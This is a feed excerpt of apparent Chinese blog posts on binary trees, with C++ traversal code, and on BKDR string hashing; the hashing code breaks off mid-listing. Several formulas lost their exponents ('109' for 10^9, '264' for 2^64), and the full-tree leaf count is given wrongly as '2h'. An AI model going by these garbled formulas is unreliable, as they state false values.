&lt;h3 id=&#34;二叉树的性质&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二叉树的性质&#34;&gt;#&lt;/a&gt; 二叉树的性质&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;二叉树的第 i ii 层至多有 2 i − 1 2^{i-1} 2 ^i−1 个结点；&lt;/li&gt;
&lt;li&gt;深度为 k 的二叉树至多有 2^k−1 个结点；&lt;/li&gt;
&lt;li&gt;对任何一棵二叉树 T，如果其终端结点数为 n0，度为 2 的结点数为，则 n0=n2+1&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;二叉树的实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二叉树的实现&#34;&gt;#&lt;/a&gt; 二叉树的实现&lt;/h3&gt;
&lt;h4 id=&#34;结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#结构&#34;&gt;#&lt;/a&gt; 结构&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct BiNode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DataType data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * lchild,*rchild;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class BiTree&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiTree()&amp;#123;root = Create(root);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ~BiTree()&amp;#123;Release(root);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PreOrder()&amp;#123;PreOrder(root);&amp;#125;	//前序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void InOrder()&amp;#123;InOrder(root);&amp;#125;		//中序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PostOrder()&amp;#123;PostOrder(root);&amp;#125;	//后序遍历&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * root;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BiNode&amp;lt;DataType&amp;gt; * Create(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void Release(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PreOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void InOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    void PostOrder(BiNode&amp;lt;DataType&amp;gt; *bt);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;建立二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#建立二叉树&#34;&gt;#&lt;/a&gt; 建立二叉树&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;BiNode&amp;lt;DataType&amp;gt; *BiTree&amp;lt;DataType&amp;gt;::Create(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DataType ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cin&amp;gt;&amp;gt;ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(ch == &amp;#x27;#&amp;#x27;) bt = NULL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt = new BiNode&amp;lt;DataType&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;data = ch;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;lchild = Create(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bt-&amp;gt;rchild = Create(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return bt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;释放二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#释放二叉树&#34;&gt;#&lt;/a&gt; 释放二叉树&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::Release(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt != NULL)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Release(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Release(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        delete bt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;前序遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前序遍历&#34;&gt;#&lt;/a&gt; 前序遍历&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::PreOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PreOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PreOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;中序遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#中序遍历&#34;&gt;#&lt;/a&gt; 中序遍历&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::InOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        InOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        InOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;后序遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后序遍历&#34;&gt;#&lt;/a&gt; 后序遍历&lt;/h4&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::PostOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PostOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PostOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;满二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#满二叉树&#34;&gt;#&lt;/a&gt; 满二叉树&lt;/h3&gt;
&lt;p&gt;一棵深度为 k 且有 2^k-1 个结点的二叉树称为满二叉树。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151745758?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;满二叉树的性质&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#满二叉树的性质&#34;&gt;#&lt;/a&gt; 满二叉树的性质：&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;一颗树深度为 h 最大层数为 k 深度与最大层数相同，k = h ;&lt;/li&gt;
&lt;li&gt;叶子数为 2h;&lt;/li&gt;
&lt;li&gt;第 k 层的结点数是 2^k−1;&lt;/li&gt;
&lt;li&gt;总结点数是：2^k−1 且总节点数一定是奇数。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;完全二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#完全二叉树&#34;&gt;#&lt;/a&gt; 完全二叉树&lt;/h3&gt;
&lt;p&gt;深度为 k 的，有 n 个结点的二叉树，当且仅当其每一个结点都与深度为 k 的满二叉树中编号从 1 至 n 的结点一一对应时，称之为完全二叉树。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151734461?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;完全二叉树是效率很高的数据结构，堆是一种完全二叉树或者近似完全二叉树，所以效率极高，像十分常用的排序算法、Dijkstra 算法、Prim 算法等都要用堆才能优化，二叉排序树的效率也要借助平衡性来提高，而平衡性基于完全二叉树。&lt;/p&gt;
&lt;h3 id=&#34;二叉排序树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二叉排序树&#34;&gt;#&lt;/a&gt; 二叉排序树&lt;/h3&gt;
&lt;p&gt;二叉查找树定义：又称为是二叉排序树（Binary Sort Tree）或二叉搜索树。&lt;/p&gt;
&lt;p&gt;二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；&lt;/li&gt;
&lt;li&gt;若它的右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值；&lt;/li&gt;
&lt;li&gt;它的左、右子树也分别为二叉排序树。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;平衡二叉树&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#平衡二叉树&#34;&gt;#&lt;/a&gt; 平衡二叉树&lt;/h3&gt;
&lt;p&gt;平衡二叉树（Balanced Binary Tree）又被称为 AVL 树。它或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且左子树和右子树的深度之差的绝对值不超过 1。（注：平衡二叉树应该是一棵二叉排序树）&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/</guid>
            <title>CPP字符串hash</title>
            <link>https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/</link>
            <pubDate>Sat, 14 Jan 2023 03:09:06 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;hash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hash&#34;&gt;#&lt;/a&gt; Hash&lt;/h1&gt;
&lt;p&gt;Hash 就是一个像函数一样的东西，你放进去一个值，它给你输出来一个值。输出的值就是 Hash 值。一般 Hash 值会比原来的值更好储存 (更小) 或比较。&lt;/p&gt;
&lt;p&gt;那字符串 Hash 就非常好理解了。就是把字符串转换成一个整数的函数。而且要尽量做到使字符串对应唯一的 Hash 值。&lt;/p&gt;
&lt;p&gt;字符串 Hash 的种类还是有很多种的，不过在信息学竞赛中只会用到一种名为 “BKDR Hash” 的字符串 Hash 算法。&lt;/p&gt;
&lt;p&gt;它的主要思路是选取恰当的进制，可以把字符串中的字符看成一个大数字中的每一位数字，不过比较字符串和比较大数字的复杂度并没有什么区别 (高精数的比较也是 O (n)&lt;/p&gt;
&lt;p&gt;那么我们选择什么进制比较好？&lt;/p&gt;
&lt;p&gt;首先不要把任意字符对应到数字 0，比如假如把 a 对应到数字 0，那么将不能只从 Hash 结果上区分 ab 和 b（虽然可以额外判断字符串长度，但不把任意字符对应到数字 0 更加省事且没有任何副作用），一般而言，把 a-z 对应到数字 1-26 比较合适。&lt;/p&gt;
&lt;p&gt;关于进制的选择实际上非常自由，大于所有字符对应的数字的最大值，不要含有模数的质因子 (那还模什么)，比如一个字符集是 a 到 z 的题目，选择 27、233、19260817 都是可以的。&lt;/p&gt;
&lt;p&gt;模数的选择（尽量还是要选择质数）：&lt;/p&gt;
&lt;p&gt;绝大多数情况下，不要选择一个 109&lt;/p&gt;
&lt;p&gt;最稳妥的办法是选择两个 109 如果能背过或在考场上找出一个 1018 偷懒的写法就是直接使用 unsigned long long，不手动进行取模，它溢出时会自动对 264&lt;/p&gt;
&lt;h2 id=&#34;用luogu-p3370为例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用luogu-p3370为例&#34;&gt;#&lt;/a&gt; 用 luogu P3370 为例。&lt;/h2&gt;
&lt;p&gt;这是自然溢出 hash (100)&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=ans*base+(ull)s[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans&amp;amp;0x7fffffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span 